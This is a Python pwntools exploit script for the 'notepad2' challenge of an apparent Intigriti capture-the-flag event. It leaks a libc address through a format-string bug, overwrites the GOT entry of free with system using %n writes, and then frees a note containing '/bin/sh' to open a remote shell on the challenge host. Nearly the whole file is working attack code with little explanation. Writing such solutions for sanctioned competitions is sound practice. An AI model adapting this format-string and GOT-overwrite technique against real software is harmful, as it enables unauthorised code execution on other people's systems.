#!/usr/bin/env python3

from pwn import *

exe = ELF("./notepad2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("notepad2.ctf.intigriti.io", 1342)

    return r


def main():
    r = conn()
    def createNote(index, data):
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'> ', index)
        r.sendlineafter(b'> ', data)
    def viewNote(index):
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'> ', index)

    def deleteNote(index):
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'> ', index)
    input()
    # Leak dia chi libc
    createNote(b'0', b'%13$p')

    viewNote(b'0')

    libc_leak = int(r.recv(16), 16)
    libc.address = libc_leak - 0x28150
    info(b'Libc leak address: ' + hex(libc_leak).encode())
    info(b'Libc address: ' + hex(libc.address).encode())
    info(b'Libc system address: ' + hex(libc.sym['system']).encode())
    info(b'Libc got address: ' + hex(libc.sym['free']).encode())
    deleteNote(b'0')
    pause()
    # Leak canary
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', '%7$p')

    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', b'1')
    # canary_leak = int(r.recv(16), 16)
    # info(b'Canary leak: ' + hex(canary_leak).encode())
    # # Leak rbp address
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', '%8$p')

    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', b'2')
    # save_rbp = int(r.recv(16), 16)
    # info(b'Save_rbp: ' + hex(save_rbp).encode())

    # # Leak return main address
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', b'3')
    # r.sendlineafter(b'> ', b'%9$p')

    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', b'3')
    # return_main = int(r.recv(7), 16)
    # info(b'Return main address: ' + hex(return_main).encode())

    # Overwrite GOT printf
    # exe.address = 0x00000000003fe000
    system_plt  = libc.sym['system']
    for i in range(3):
        createNote(str(i).encode(), f'%{exe.got.free + (i*2)}c%17$lln')
        viewNote(str(i).encode())
        createNote(str(9-i).encode(), f'%{system_plt &0xffff}c%47$hn')
        viewNote(str(9-i).encode())
        system_plt >>= 16
    
    createNote(b'6', b'/bin/sh\0')
    deleteNote(b'6')
    
    pause()
    
    # Trigger /bin/sh
    # r.sendlineafter(b'> ', b'1')
    # r.sendlineafter(b'> ', b'5')
    # r.sendlineafter(b'> ', b'/bin/sh')
    # pause()
    # r.sendlineafter(b'> ', b'2')
    # r.sendlineafter(b'> ', b'5')
    # pause()
    # good luck pwning :)
    
    r.interactive()


if __name__ == "__main__":
    main()

